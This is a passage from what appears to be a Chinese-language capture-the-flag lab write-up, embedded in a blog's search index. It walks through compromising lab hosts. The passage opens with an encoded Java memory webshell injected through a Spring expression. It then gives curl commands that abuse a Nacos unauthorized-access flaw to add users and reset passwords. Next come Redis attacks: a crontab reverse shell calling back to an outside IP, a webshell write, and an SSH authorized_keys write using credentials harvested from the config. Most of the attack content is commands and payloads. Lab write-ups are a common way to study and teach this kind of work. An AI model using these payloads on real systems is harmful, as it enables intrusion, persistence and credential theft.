BJMamF2YS9sYW5nL1N0cmluZzsBAANtZDUBAAJ4YwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAOTG1zL0dNZW1TaGVsbDsBAAhkb0luamVjdAEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAVcmVnaXN0ZXJIYW5kbGVyTWV0aG9kAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAA5leGVjdXRlQ29tbWFuZAEAEnJlcXVlc3RNYXBwaW5nSW5mbwEAQ0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9yZWFjdGl2ZS9yZXN1bHQvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbzsBAANtc2cBAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQADb2JqAQASTGphdmEvbGFuZy9PYmplY3Q7AQAEcGF0aAEADVN0YWNrTWFwVGFibGUHAM0HAMcBABBNZXRob2RQYXJhbWV0ZXJzAQALZGVmaW5lQ2xhc3MBABUoW0IpTGphdmEvbGFuZy9DbGFzczsBAApjbGFzc2J5dGVzAQACW0IBAA51cmxDbGFzc0xvYWRlcgEAGUxqYXZhL25ldC9VUkxDbGFzc0xvYWRlcjsBAAZtZXRob2QBAApFeGNlcHRpb25zAQABeAEAByhbQlopW0IBAAFjAQAVTGphdmF4L2NyeXB0by9DaXBoZXI7AQABcwEAAW0BAAFaBwDFBwEaAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAB1MamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwEAA3JldAEADGJhc2U2NEVuY29kZQEAFihbQilMamF2YS9sYW5nL1N0cmluZzsBAAdFbmNvZGVyAQAGYmFzZTY0AQARTGphdmEvbGFuZy9DbGFzczsBAAJicwEABXZhbHVlAQAMYmFzZTY0RGVjb2RlAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAB2RlY29kZXIBAANjbWQBAF0oTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZlci9TZXJ2ZXJXZWJFeGNoYW5nZTspTG9yZy9zcHJpbmdmcmFtZXdvcmsvaHR0cC9SZXNwb25zZUVudGl0eTsBAAxidWZmZXJTdHJlYW0BAAJleAEABXBkYXRhAQAyTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZlci9TZXJ2ZXJXZWJFeGNoYW5nZTsBABlSdW50aW1lVmlzaWJsZUFubm90YXRpb25zAQA1TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2JpbmQvYW5ub3RhdGlvbi9Qb3N0TWFwcGluZzsBAAQvY21kAQANbGFtYmRhJGNtZCQxMQEARyhMb3JnL3NwcmluZ2ZyYW1ld29yay91dGlsL011bHRpVmFsdWVNYXA7KUxyZWFjdG9yL2NvcmUvcHVibGlzaGVyL01vbm87AQAGYXJyT3V0AQAfTGphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtOwEAAWYBAAJpZAEABGRhdGEBAChMb3JnL3NwcmluZ2ZyYW1ld29yay91dGlsL011bHRpVmFsdWVNYXA7AQAGcmVzdWx0AQAZTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwcAtwEACDxjbGluaXQ+AQAKU291cmNlRmlsZQEADkdNZW1TaGVsbC5qYXZhDABpAGoBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwAZQBmDAEbARwMAGgAZgwBHQEeDABnAJIMAGcAZgwBHwEgAQAPamF2YS9sYW5nL0NsYXNzAQAQamF2YS9sYW5nL09iamVjdAEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEAQW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3JlYWN0aXZlL3Jlc3VsdC9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvDAEhASIMASMBJAEADG1zL0dNZW1TaGVsbAEAMG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZlci9TZXJ2ZXJXZWJFeGNoYW5nZQEAEGphdmEvbGFuZy9TdHJpbmcMASUBKAcBKQwBKgErDAEsAS0BAAJvawEAE2phdmEvbGFuZy9FeGNlcHRpb24MAS4AagEABWVycm9yAQAXamF2YS9uZXQvVVJMQ2xhc3NMb2FkZXIBAAxqYXZhL25ldC9VUkwHAS8MATABMQwBMgEzDABpATQBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIHATUMATYAmQwBNwE4AQADQUVTBwEaDAE5AToBAB9qYXZheC9jcnlwdG8vc3BlYy9TZWNyZXRLZXlTcGVjDAE7ATwMAGkBPQwBPgE/DAFAAUEBAANNRDUHAUIMATkBQwwBRAFFDAFGAUcBABRqYXZhL21hdGgvQmlnSW50ZWdlcgwBSAE8DABpAUkMAR0BSgwBSwEeAQAQamF2YS51dGlsLkJhc2U2NAwBTAFNAQAKZ2V0RW5jb2RlcgwBTgEiAQAOZW5jb2RlVG9TdHJpbmcBABZzdW4ubWlzYy5CQVNFNjRFbmNvZGVyDAFPAVABAAZlbmNvZGUBAApnZXREZWNvZGVyAQAGZGVjb2RlAQAWc3VuLm1pc2MuQkFTRTY0RGVjb2RlcgEADGRlY29kZUJ1ZmZlcgwBUQFSAQAQQm9vdHN0cmFwTWV0aG9kcw8GAVMQAVQPBwFVEACpDAFWAVcHAVgMAVkBWgEAJ29yZy9zcHJpbmdmcmFtZXdvcmsvaHR0cC9SZXNwb25zZUVudGl0eQcBWwwBXAFdDABpAV4MAV8BHgcBYAwBYQFUDACcAJ0MAIkAigwAYQBiAQAHcGF5bG9hZAcBYgwBYwFUDACBAIIMAWQBZQEACnBhcmFtZXRlcnMBAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQwBZgFnDAFoAWkMAWoBPAwAlQCWDAFoAUoMAWsBbAEAEWphdmEvdXRpbC9IYXNoTWFwAQAQM2M2ZTBiOGE5YzE1MjI0YQEAE2phdmF4L2NyeXB0by9DaXBoZXIBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQANc2V0QWNjZXNzaWJsZQEABChaKVYBAAVwYXRocwEAB0J1aWxkZXIBAAxJbm5lckNsYXNzZXMBAGAoW0xqYXZhL2xhbmcvU3RyaW5nOylMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvcmVhY3RpdmUvcmVzdWx0L21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8kQnVpbGRlcjsBAElvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9yZWFjdGl2ZS9yZXN1bHQvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbyRCdWlsZGVyAQAFYnVpbGQBAEUoKUxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9yZWFjdGl2ZS9yZXN1bHQvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbzsBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAA9wcmludFN0YWNrVHJhY2UBABBqYXZhL2xhbmcvVGhyZWFkAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7AQAVZ2V0Q29udGV4dENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAKShbTGphdmEvbmV0L1VSTDtMamF2YS9sYW5nL0NsYXNzTG9hZGVyOylWAQARamF2YS9sYW5nL0ludGVnZXIBAARUWVBFAQAHdmFsdWVPZgEAFihJKUxqYXZhL2xhbmcvSW50ZWdlcjsBAAtnZXRJbnN0YW5jZQEAKShMamF2YS9sYW5nL1N0cmluZzspTGphdmF4L2NyeXB0by9DaXBoZXI7AQAIZ2V0Qnl0ZXMBAAQoKVtCAQAXKFtCTGphdmEvbGFuZy9TdHJpbmc7KVYBAARpbml0AQAXKElMamF2YS9zZWN1cml0eS9LZXk7KVYBAAdkb0ZpbmFsAQAGKFtCKVtCAQAbamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0AQAxKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwEABmxlbmd0aAEAAygpSQEABnVwZGF0ZQEAByhbQklJKVYBAAZkaWdlc3QBAAYoSVtCKVYBABUoSSlMamF2YS9sYW5nL1N0cmluZzsBAAt0b1VwcGVyQ2FzZQEAB2Zvck5hbWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAJZ2V0TWV0aG9kAQALbmV3SW5zdGFuY2UBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwEAC2dldEZvcm1EYXRhAQAfKClMcmVhY3Rvci9jb3JlL3B1Ymxpc2hlci9Nb25vOwoBbQFuAQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsKABIBbwEABWFwcGx5AQAtKExtcy9HTWVtU2hlbGw7KUxqYXZhL3V0aWwvZnVuY3Rpb24vRnVuY3Rpb247AQAbcmVhY3Rvci9jb3JlL3B1Ymxpc2hlci9Nb25vAQAHZmxhdE1hcAEAPChMamF2YS91dGlsL2Z1bmN0aW9uL0Z1bmN0aW9uOylMcmVhY3Rvci9jb3JlL3B1Ymxpc2hlci9Nb25vOwEAI29yZy9zcHJpbmdmcmFtZXdvcmsvaHR0cC9IdHRwU3RhdHVzAQACT0sBACVMb3JnL3NwcmluZ2ZyYW1ld29yay9odHRwL0h0dHBTdGF0dXM7AQA6KExqYXZhL2xhbmcvT2JqZWN0O0xvcmcvc3ByaW5nZnJhbWV3b3JrL2h0dHAvSHR0cFN0YXR1czspVgEACmdldE1lc3NhZ2UBACZvcmcvc3ByaW5nZnJhbWV3b3JrL3V0aWwvTXVsdGlWYWx1ZU1hcAEACGdldEZpcnN0AQANamF2YS91dGlsL01hcAEAA2dldAEAA3B1dAEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAGZXF1YWxzAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQAJc3Vic3RyaW5nAQAWKElJKUxqYXZhL2xhbmcvU3RyaW5nOwEAC3RvQnl0ZUFycmF5AQAEanVzdAEAMShMamF2YS9sYW5nL09iamVjdDspTHJlYWN0b3IvY29yZS9wdWJsaXNoZXIvTW9ubzsHAXAMAXEBdAwAqACpAQAiamF2YS9sYW5nL2ludm9rZS9MYW1iZGFNZXRhZmFjdG9yeQEAC21ldGFmYWN0b3J5BwF2AQAGTG9va3VwAQDMKExqYXZhL2xhbmcvaW52b2tlL01ldGhvZEhhb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&#x27;),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject(@requestMappingHandlerMapping,&#x27;/nnmm&#x27;)&#125;&quot;    &#125;  &#125;],  &quot;uri&quot;: &quot;http://example.com&quot;&#125;

之后哥斯拉成功连接

发现存在网卡192.168.88.60

上传fscan扫一下发现另一台主机192.168.88.70（但是这里我一直上传不了，做了代理依旧没用🤡

接着来看8848端口，nacos有个未授权访问漏洞，漏洞地址：&#x2F;nacos&#x2F;v1&#x2F;auth&#x2F;users?pageNo&#x3D;1&amp;pageSize&#x3D;9，发现绕过鉴权返回用户列表数据，但是密码通过bcrypt加密了
username    &quot;nacos&quot;password    &quot;$2a$10$/WcAwSqpXiDCq/zpuNVQGOPBIZ7jpUv60MyyXNQEqkK4b8k3rDQU6&quot;


于是我们尝试如下命令来添加新用户或者改密码
# linux 是用单引号，window用双引号，否则会提示curl: no URL specified# 新增用户curl -XPOST -d &#x27;username=test&amp;password=test&#x27; &#x27;http://192.168.100.50:8848/nacos/v1/auth/users&#x27;# 修改用户密码curl -XPUT -d &#x27;username=nacos&amp;newPassword=nacos&#x27; &#x27;http://192.168.100.50:8848/nacos/v1/auth/users&#x27;# 删除用户curl -XDELETE -d &#x27;username=test&#x27; &#x27;http://192.168.100.50:8848/nacos/v1/auth/users&#x27;


访问首页/nacos，成功登录

很多内网应用都会把application.yml配置在这个配置中心，基本可以通过snakeyaml的payload横向打所有内网应用，结合https://github.com/artsploit/yaml-payload， 修改server配置，可导致RCE
redis根据前面nacos可以发现redis-task，配置信息如下：
server:  port: 8586 api:  task:    url: http://127.0.0.1/api/office/taskHandle knife4j:  redis:    host: 0.0.0.0    password: nbsg@123456    port: 6379    databases: 0,1,2,3,4,5,6,7    timeout: 60000  logging:  config: classpath:logback.xml xxl:  job:    admin:      addresses: http://127.0.0.1:8998/xxl-job-admin    accessToken: X336qlhSuYz2Nshk    executor:      appname: redis-task      address:      ip:      port: 5599      logpath: /data/logs/xxl-job/redis-task      logretentiondays: 5  app:  mq:    delay:      queue: bb_DELAY_QUEUE      exchange: bb_delay_exchange spring:  rabbitmq:    host: 127.0.0.1    port: 5672    username: admin    password: global2018#    virtualHost: /

可知redis的密码是nbsg@123456，并使用redis-cli成功连接redis服务器，其版本为4.0.10（不用密码也行🤐
redis-cli -h 192.168.88.70 -a &quot;nbsg@123456&quot;


利用姿势1：在crontab里写定时任务反弹shell（失败）

相关配置文件：
&#x2F;var&#x2F;spool&#x2F;cron&#x2F; 目录下存放的是每个用户包括root的crontab任务，每个任务以创建者的名字命名
&#x2F;etc&#x2F;crontab 这个文件负责调度各种管理和维护任务。
&#x2F;etc&#x2F;cron.d&#x2F; 这个目录用来存放任何要执行的crontab文件或脚本。
我们还可以把脚本放在&#x2F;etc&#x2F;cron.hourly、&#x2F;etc&#x2F;cron.daily、&#x2F;etc&#x2F;cron.weekly、&#x2F;etc&#x2F;cron.monthly目录中，让它每小时&#x2F;天&#x2F;星期、月执行一次。

# 添加名为xxx的key，值为后面反弹shell的语句，5个星号代表每分钟执行一次，其中的\n同样是为了换行，避免crontab的语法错误set xxx &quot;\n\n* * * * * bash -i&gt;&amp; /dev/tcp/192.168.150.128/1234 0&gt;&amp;1\n\n&quot;# 在kali和ubantu中，其文件位置为/var/spool/cron/crontabs/root，在centos系列中位置为/var/spool/cron/root，通常情况下没有root文件，需要自己创建config set dir /var/spool/cronconfig set dbfilename rootsave


但是等了半天还是没弹，于是查看一下计划任务发现也没有反弹shell命令写入了靶机
cd /var/spool/croncrontab -l


检查定时任务是否执行
tail -10000f /var/log/cron | grep &#x27;bash&#x27;

利用姿势2：利用redis数据库的备份功能，直接向Web目录中写webshell，但是发现不是默认路径无法利用
config set dir /var/www/html/config set dbfilename 1.phpset webshell &quot;&lt;?php phpinfo();?&gt;&quot;save


利用姿势3：redis写入ssh公钥，获取操作系统权限
kali生成ssh公钥和私钥，密码设置为空
ssh-keygen -t rsa


进入.ssh目录，然后将生成的公钥写入ceshi.txt文件
(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt;ceshi.txt


将保存ssh的公钥ceshi.txt写入redis
cat ceshi.txt | redis-cli -h 192.168.88.70 -a &quot;nbsg@123456&quot; -x set crack


连接redis，使用 CONFIG GET dir 命令得到redis备份的路径，更改redis备份路径为ssh公钥存放目录（一般默认为&#x2F;root&#x2F;.ssh）并设置上传公钥的备份文件名字为authorized_keys：
config get dirconfig set dir /root/.ssh/config set dbfilename &quot;authorized_keys&quot;save


成功写入ssh公钥到靶机，然后使用ssh免密登录靶机，得到flag3：flag{good_redis}
ssh -i id_rsa root@192.168.88.70


]]></content>
      <categories>
        <category>靶场通关</category>
      </categories>
      <tags>
        <tag>vulntarget</tag>
      </tags>
  </entry>
</search>
